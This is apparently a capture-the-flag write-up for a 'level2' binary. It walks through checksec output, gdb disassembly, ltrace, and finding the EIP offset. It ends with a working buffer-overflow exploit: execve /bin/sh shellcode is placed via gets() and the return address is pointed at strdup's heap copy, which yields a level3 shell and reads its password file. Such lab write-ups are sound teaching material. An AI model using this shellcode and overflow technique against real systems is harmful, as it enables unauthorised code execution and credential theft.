# Level 2

```bash 
GCC stack protector support:            Enabled
Strict user copy checks:                Disabled
Restrict /dev/mem access:               Enabled
Restrict /dev/kmem access:              Enabled
grsecurity / PaX: No GRKERNSEC
Kernel Heap Hardening: No KERNHEAP
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
```

## Testing the program

```bash
$ ./level2
a
a
```

The program displays the input

## Learning more

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   %ebp
   0x08048540 <+1>:	mov    %esp,%ebp
   0x08048542 <+3>:	and    $0xfffffff0,%esp
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret    
End of assembler dump.
```

The main calls a function 'p'. 

```bash
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp
   0x080484da <+6>:	mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.
```

```bash
0x080484ed <+25>:	call   0x80483c0 <gets@plt>
[...]
0x080484fb <+39>:	and    $0xb0000000,%eax
0x08048500 <+44>:	cmp    $0xb0000000,%eax
```

Like in level1, we can see a call to gets() function which is vulnerable to buffer overflow attack.
A check is made to make sure we dont overwrite the return address to an adress on the stack. 
The restriction on our return address appears to be anything that starts with the the bit ‘b’ (indicated by the ‘and’ calculation with the value "0xb0000000").
Due to this check we couldn't point the return address to the stack (0xbf000000 - 0xbfffffff range). This avoids having a shellcode stored on the stack or in environment variable. But if we can't use the stack we can use the heap !

```bash
0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
```

We see in the program that the buffer is later copied inside a strdup. 
This function use malloc which stores the memory on the heap.


```bash
ltrace ./level2 
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                              = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)   = 0xbffff6fc
puts("")                                        = 1
strdup("")                                      = 0x0804a008
+++ exited (status 8) +++
```

We see that the malloc returns the address '0x0804a008'


## Getting access to the shell 

We are going to use the vulnerability of gets() to overwrite the return address (EIP) so it points to our shellcode saved in the heap at the address 0x0804a008. 


First let's find the offset in order to get to EIP. 
We generate a pettern using [this website](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)

```bash
$ gdb level2
(gdb) run
Starting program: /home/user/level2/level2 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) info register eip
eip            0x37634136	0x37634136
```

We found that the offset of eip starts at 80.
Our shellcode will be a classic bin/sh : 
```plaintext
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

which we found [here](https://shell-storm.org/shellcode/files/shellcode-575.html)

So we have : 
• shellcode : 21 bytes --> Executes /bin/sh
• arbitrary data : 59 bytes --> Padding to fill the buffer
• return address : 4 bytes --> Points to our shellcode in the heap thanks to the malloc of strdup

```bash
$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/coucou
cat /tmp/coucou - | ./level2
j
 X?Rh//shh/bin??1?̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?
whoami
level3
cat /home/user/level3/.pass
***************************************
```